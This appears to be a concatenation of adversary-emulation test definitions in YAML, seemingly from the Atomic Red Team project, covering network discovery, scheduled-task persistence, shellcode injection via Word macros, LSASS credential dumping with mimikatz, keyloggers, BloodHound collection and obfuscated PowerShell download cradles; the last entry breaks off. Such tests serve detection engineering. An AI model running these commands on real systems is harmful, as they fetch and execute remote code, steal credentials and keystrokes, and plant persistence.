  auto_generated_guid: 9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2
  description: |
    Get a listing of network connections.

    Upon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.
  supported_platforms:
  - linux
  - macos
  dependency_executor_name: sh
  dependencies:
  - description: |
      Check if netstat command exists on the machine
    prereq_command: |
      if [ -x "$(command -v netstat)" ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      echo "Install netstat on the machine."; exit 1;
  executor:
    command: |
      netstat
      who -a
    name: sh

- name: System Discovery using SharpView
  auto_generated_guid: 96f974bb-a0da-4d87-a744-ff33e73367e9
  description: |
    Get a listing of network connections, domains, domain users, and etc.  
    sharpview.exe located in the bin folder, an opensource red-team tool.
    Upon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.
  supported_platforms:
    - windows
  input_arguments:
    SharpView_url:
      description: sharpview download URL
      type: Url
      default: https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true
    SharpView:
      description: Path of the executable opensource redteam tool used for the performing this atomic.
      type: Path
      default: PathToAtomicsFolder\T1049\bin\SharpView.exe
    syntax:
      description: Arguements method used along with SharpView to get listing of network connections, domains, domain users, and etc.  
      type: String
      default: | 
        "Invoke-ACLScanner", "Invoke-Kerberoast", "Find-DomainShare" 
  dependency_executor_name: powershell
  dependencies:
    - description: |
        Sharpview.exe must exist on disk at specified location (#{SharpView})
      prereq_command: |
        if (Test-Path #{SharpView}) {exit 0} else {exit 1}
      get_prereq_command: |
        New-Item -Type Directory (split-path #{SharpView}) -ErrorAction ignore | Out-Null
        Invoke-WebRequest #{SharpView_url} -OutFile "#{SharpView}"
  executor:
    name: powershell
    elevation_required: true
    command: | 
      $syntaxList = #{syntax}
      foreach ($syntax in $syntaxList) {
      #{SharpView} $syntax -}



- name: Scheduled Task Startup Script
  auto_generated_guid: fec27f65-db86-4c2d-b66c-61945aee87c2
  description: |
    Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view
    the tasks, open the Task Scheduler and look in the Active Tasks pane.
  supported_platforms:
  - windows
  executor:
    command: |
      schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
      schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
    cleanup_command: |
      schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
      schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Scheduled task Local
  auto_generated_guid: 42f53695-ad4a-4546-abb6-7d837f644a71
  description: |
    Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.
  supported_platforms:
    - windows
  input_arguments:
    task_command:
      description: What you want to execute
      type: String
      default: C:\windows\system32\cmd.exe
    time:
      description: What time 24 Hour
      type: String
      default: "20:10"
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
    cleanup_command: |
      SCHTASKS /Delete /TN spawn /F >nul 2>&1
- name: Scheduled task Remote
  auto_generated_guid: 2e5eac3e-327b-4a88-a0c0-c4057039a8dd
  description: |
      Create a task on a remote system.

      Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.
  supported_platforms:
    - windows
  input_arguments:
    task_command:
      description: What you want to execute
      type: String
      default: C:\windows\system32\cmd.exe
    time:
      description: What time 24 Hour
      type: String
      default: "20:10"
    target:
      description: Target
      type: String
      default: localhost
    user_name:
      description: 'Username to authenticate with, format: DOMAIN\User'
      type: String
      default: DOMAIN\user
    password:
      description: Password to authenticate with
      type: String
      default: At0micStrong
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
    cleanup_command: |
      SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN "Atomic task" /F >nul 2>&1
- name: Powershell Cmdlet Scheduled Task
  auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
  description: |
    Create an atomic scheduled task that leverages native powershell cmdlets.

    Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      $Action = New-ScheduledTaskAction -Execute "calc.exe"
      $Trigger = New-ScheduledTaskTrigger -AtLogon
      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
      $Set = New-ScheduledTaskSettingsSet
      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
      Register-ScheduledTask AtomicTask -InputObject $object
    cleanup_command: |
      Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1
- name: Task Scheduler via VBA
  auto_generated_guid: ecd3fa21-7792-41a2-8726-2c5c673414d3
  description: |
    This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
    30 - 40 seconds after this module has run
  supported_platforms:
  - windows
  input_arguments:
    ms_product:
      description: Maldoc application Word
      type: String
      default: Word
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Microsoft #{ms_product} must be installed
    prereq_command: |
      try {
        New-Object -COMObject "#{ms_product}.Application" | Out-Null
        $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
        Stop-Process -Name $process
        exit 0
      } catch { exit 1 }
    get_prereq_command: |
      Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
      Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
    name: powershell
- name: WMI Invoke-CimMethod Scheduled Task
  auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
  description: |
    Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.
  supported_platforms:
    - windows
  input_arguments:
    xml_path:
      description: path of vbs to use when creating masquerading files
      type: Path
      default: PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml
  dependency_executor_name: powershell
  dependencies:
    - description: |
        File to copy must exist on disk at specified location (#{xml_path})
      prereq_command: |
        if (Test-Path #{xml_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        New-Item -Type Directory (split-path #{xml_path}) -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml" -OutFile "#{xml_path}"
  executor:
    name: powershell
    elevation_required: true
    command: |
      $xml = [System.IO.File]::ReadAllText("#{xml_path}")
      Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
    cleanup_command: |
      Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1
- name: Scheduled Task Executing Base64 Encoded Commands From Registry
  auto_generated_guid: e895677d-4f06-49ab-91b6-ae3742d0a2ba
  description: |
    A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.
    The scheduled task will launch powershell to decode and run the command in the registry daily.
    This is a persistence mechanism recently seen in use by Qakbot.  
    
    [Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)
  supported_platforms:
  - windows
  input_arguments:
    time:
      description: Daily scheduled task execution time
      type: string
      default: '07:45'
  executor:
    command: |
      reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
      schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
    cleanup_command: |
      schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
      reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
    name: command_prompt
- name: Import XML Schedule Task with Hidden Attribute 
  auto_generated_guid: cd925593-fbb4-486d-8def-16cbdf944bf4
  description: |
    Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. 
    This technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.
  supported_platforms:
    - windows
  input_arguments:
    xml_path:
      description: path of vbs to use when creating masquerading files
      type: Path
      default: PathToAtomicsFolder\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml
  dependency_executor_name: powershell
  dependencies:
    - description: |
        File to copy must exist on disk at specified location (#{xml_path})
      prereq_command: |
        if (Test-Path #{xml_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        New-Item -Type Directory (split-path #{xml_path}) -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml" -OutFile "#{xml_path}"
  executor:
    name: powershell
    elevation_required: true
    command: |
      $xml = [System.IO.File]::ReadAllText("#{xml_path}")
      Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
    cleanup_command: |
      Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false >$null 2>&1
- name: PowerShell Modify A Scheduled Task
  auto_generated_guid: dda6fc7b-c9a6-4c18-b98d-95ec6542af6d
  description: |
    Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. 
    It will first be created to spawn cmd.exe, but modified to run notepad.exe.

    Upon successful execution, powershell.exe will create a scheduled task and modify the action. 
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      $Action = New-ScheduledTaskAction -Execute "cmd.exe"
      $Trigger = New-ScheduledTaskTrigger -AtLogon
      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
      $Set = New-ScheduledTaskSettingsSet
      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
      Register-ScheduledTask AtomicTaskModifed -InputObject $object
      $NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
      Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
    cleanup_command: |
      Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false >$null 2>&1



- name: Shellcode execution via VBA
  auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
  description: |
    This module injects shellcode into a newly created process and executes. By default the shellcode is created,
    with Metasploit, for use on x86-64 Windows 10 machines.

    Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
    is required.
  supported_platforms:
  - windows
  input_arguments:
    txt_path:
      description: Path to file containing VBA macro to run
      type: Path
      default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The 64-bit version of Microsoft Office must be installed
    prereq_command: |
      try {
        $wdApp = New-Object -COMObject "Word.Application"
        $path = $wdApp.Path
        Stop-Process -Name "winword"
        if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
      } catch { exit 1 }
    get_prereq_command: |
      Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
  - description: |
      #{txt_path} must exist on disk at specified location
    prereq_command: |
      if (Test-Path #{txt_path}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{txt_path}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt" -OutFile "#{txt_path}"
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
      Invoke-Maldoc -macroFile "#{txt_path}" -officeProduct "Word" -sub "Execute"
    name: powershell
- name: Remote Process Injection in LSASS via mimikatz
  auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
  description: |
    Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
    Especially useful against domain controllers in Active Directory environments.
    It must be executed in the context of a user who is privileged on remote `machine`.

    The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
  supported_platforms:
  - windows
  input_arguments:
    machine:
      description: machine to target (via psexec)
      type: String
      default: DC1
    mimikatz_path:
      description: Mimikatz windows executable
      type: Path
      default: '%tmp%\mimikatz\x64\mimikatz.exe'
    psexec_path:
      description: Path to PsExec
      type: String
      default: C:\PSTools\PsExec.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
    prereq_command: |
      $mimikatz_path = cmd /c echo #{mimikatz_path}
      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
      $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
      $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
      $mimikatz_exe = cmd /c echo #{mimikatz_path}
      $basePath = Split-Path $mimikatz_exe | Split-Path
      Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
  - description: |
      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})
    prereq_command: |
      if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
      New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
  executor:
    command: |
      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
    name: command_prompt
    elevation_required: false # locally not, but remotely on target machine then yes



- name: Input Capture
  auto_generated_guid: d9b633ca-8efb-45e6-b838-70f595c6ae26
  description: |
    Utilize PowerShell and external resource to capture keystrokes
    [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
    Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)

    Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.
  supported_platforms:
  - windows
  input_arguments:
    filepath:
      description: Name of the local file, include path.
      type: Path
      default: $env:TEMP\key.log
  executor:
    command: |
      Set-Location $PathToAtomicsFolder
      .\T1056.001\src\Get-Keystrokes.ps1 -LogPath #{filepath}
    cleanup_command: |
      Remove-Item $env:TEMP\key.log -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Living off the land Terminal Input Capture on Linux with pam.d
  auto_generated_guid: 9c6bdb34-a89f-4b90-acb1-5970614c711b
  description: |
    Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.

    Passwords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).
   
    Use 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. 
  dependencies:
  - description: |
      Checking if pam_tty_audit.so is installed
    prereq_command: |
      test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'
    get_prereq_command: |
      echo "Sorry, you must install module pam_tty_audit.so and recompile, for this test to work"
  supported_platforms:
  - linux
  executor:
    command:
      if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
      if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
      sudo touch /tmp/password-auth.bk
      sudo touch /tmp/system-auth.bk
      sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth
      sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
    cleanup_command: |
      sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
      sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
    name: sh
    elevation_required: true
- name: Logging bash history to syslog
  auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
  description: |
    There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable "if set" will be executed before the PS1 variable and can be configured to write the latest "bash history" entries to the syslog.

    To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ 
  supported_platforms:
    - linux
  dependency_executor_name: sh 
  dependencies: 
    - description: |
        This test requires to be run in a bash shell and that logger and tee are installed.
      prereq_command: | 
        if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
        if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
        if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
      get_prereq_command: | 
        echo ""
  executor:
    name: sh
    elevation_required: true
    command: | 
      PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
      echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
      tail /var/log/syslog
    cleanup_command: | 
      unset PROMPT_COMMAND
- name: Bash session based keylogger
  auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
  description: |
    When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = "echo $BASH_COMMAND". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. 

    To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ 
  supported_platforms:
    - linux
  dependency_executor_name: sh 
  dependencies: 
    - description: |
        This test requires to be run in a bash shell
      prereq_command: | 
        if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
      get_prereq_command: | 
        echo ""
  input_arguments:
    output_file:
      name: output_file
      description: File to store captured commands
      type: String
      default: /tmp/.keyboard.log
  executor:
    name: sh
    elevation_required: false 
    command: | 
      trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
      echo "Hello World!"
      cat #{output_file}
    cleanup_command: | 
      rm #{output_file}
- name: SSHD PAM keylogger
  auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
  description: |
    Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.
  supported_platforms:
    - linux
  dependency_executor_name: sh 
  dependencies: 
    - description: |
        This test requires sshd and auditd
      prereq_command: | 
        if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
        if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
      get_prereq_command: | 
        echo ""
  input_arguments:
    user_account:
      description: Basic ssh user account for testing.
      type: String
      default: ubuntu
  executor:
    name: sh
    elevation_required: true 
    command: | 
      cp -v /etc/pam.d/sshd /tmp/
      echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" >> /etc/pam.d/sshd
      systemctl restart sshd
      systemctl restart auditd
      ssh #{user_account}@localhost 
      whoami
      sudo su
      whoami
      exit
      exit
    cleanup_command: | 
      cp -fv /tmp/sshd /etc/pam.d/
- name: Auditd keylogger
  auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
  description: |
    The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. 
  supported_platforms:
    - linux
  dependency_executor_name: sh 
  dependencies: 
    - description: |
        This test requires sshd and auditd
      prereq_command: | 
        if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
      get_prereq_command: | 
        echo ""
  executor:
    name: sh
    elevation_required: true 
    command: | 
      auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
      auditctl -a always,exit -F arch=b32 -S execve -k CMDS
      whoami; ausearch -i --start $(date +"%d/%m/%y %H:%M:%S") 
    cleanup_command: | 
      systemctl restart auditd
- name: MacOS Swift Keylogger
  auto_generated_guid: aee3a097-4c5c-4fff-bbd3-0a705867ae29
  description: |
    Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.
    Input Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.
    Referece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74
  supported_platforms:
    - macos
  input_arguments:
    swift_src:
        description: Location of swift script
        type: Path
        default: PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift
  dependency_executor_name: bash
  dependencies:
    - description: |
        swift script must exist at #{swift_src}, and the terminal must have input monitoring permissions.
      prereq_command: |
        if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else exit 1; fi
      get_prereq_command: |
        echo ""
  executor:
    command: |
      swift #{swift_src} -keylog
    cleanup_command: |
      kill `pgrep swift-frontend`
    name: bash
    elevation_required: false




- name: Mimikatz
  auto_generated_guid: f3132740-55bc-48c4-bcc0-758a459cd027
  description: |
    Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.
  supported_platforms:
  - windows
  input_arguments:
    mimurl:
      description: Mimikatz url
      type: Url
      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
  executor:
    command: |
      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    name: command_prompt
    elevation_required: true
- name: Run BloodHound from local disk
  auto_generated_guid: a21bb23e-e677-4ee7-af90-6931b57b6350
  description: |
    Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.

    Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
  supported_platforms:
  - windows
  input_arguments:
    file_path:
      description: File path for SharpHound payload
      type: String
      default: PathToAtomicsFolder\T1059.001\src
  dependency_executor_name: powershell
  dependencies:
  - description: |
      SharpHound.ps1 must be located at #{file_path}
    prereq_command: |
      if (Test-Path #{file_path}\SharpHound.ps1) {exit 0} else {exit 1}
    get_prereq_command: |
      Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "#{file_path}\SharpHound.ps1"
  executor:
    command: |
      write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
      import-module #{file_path}\SharpHound.ps1
      Invoke-BloodHound -OutputDirectory $env:Temp
      Start-Sleep 5
    cleanup_command: |
      Remove-Item $env:Temp\*BloodHound.zip -Force
    name: powershell
- name: Run Bloodhound from Memory using Download Cradle
  auto_generated_guid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
  description: |
    Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.

    Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
  supported_platforms:
  - windows
  executor:
    command: |
      write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
      IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
      Invoke-BloodHound -OutputDirectory $env:Temp
      Start-Sleep 5
    cleanup_command: |
      Remove-Item $env:Temp\*BloodHound.zip -Force
    name: powershell
- name: Obfuscation Tests
  auto_generated_guid: 4297c41a-8168-4138-972d-01f3ee92c804
  description: |
    Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
  supported_platforms:
  - windows
  executor:
    command: |
      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
      Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
    name: powershell
- name: Mimikatz - Cradlecraft PsSendKeys
  auto_generated_guid: af1800cf-9f9d-4fd1-a709-14b1e6de020d
  description: |
    Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
    name: powershell
    elevation_required: true
- name: Invoke-AppPathBypass
  auto_generated_guid: 06a220b6-7e29-4bd8-9d07-5b4d86742372
  description: |
    Note: Windows 10 only. Upon execution windows backup and restore window will be opened.

    Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
  supported_platforms:
  - windows
  executor:
    command: |
